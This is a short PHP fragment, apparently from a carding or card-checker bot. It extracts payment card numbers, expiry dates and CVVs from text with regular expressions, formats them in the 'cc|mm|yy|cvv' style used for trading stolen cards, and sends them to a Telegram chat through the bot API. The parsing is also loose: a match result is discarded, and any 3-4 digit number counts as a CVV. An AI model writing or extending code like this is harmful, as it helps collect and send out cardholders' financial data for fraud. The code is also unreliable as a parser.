<?php

$cc_pattern = '/\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13})\b/';
$amex_pattern = '/\b3[47][0-9]{13}\b/';
$discover_pattern = '/\b6011[ -]*[0-9]{4}[ -]*[0-9]{4}[ -]*[0-9]{4}\b|\b65[0-9]{14}\b|\b64[4-9][0-9]{13}\b|\b6011[ -]*[0-9]{4}[ -]*[0-9]{2}[ -]*[0-9]{2}\b/';
$visa_pattern = '/\b4[0-9]{12}(?:[0-9]{3})?\b/';
$mastercard_pattern = '/(?<=\s|^)(5[1-5]\d{2})(\d{4})(\d{4})(\d{4})(?=\s|$)/';
$mon_pattern = '/\b(0?[1-9]|1[0-2])\/\d{2}\b/';
$year_pattern = '/(20\d{2}|\b23\d{2}\b)/';
$cvv_pattern = '/\b\d{3,4}\b/';

(preg_match($cc_pattern, $text, $matches1) && preg_match($mon_pattern, $text, $matches2) && preg_match($year_pattern, $text, $matches3) && preg_match($cvv_pattern, $text, $matches4));
   // Valid credit card information

$cc = $matches1[0];
$mon = $matches2[0];
$year = $matches3[0];
$cvv = $matches4[0];


  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ $cc|$mon|$year|$cvv HI ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  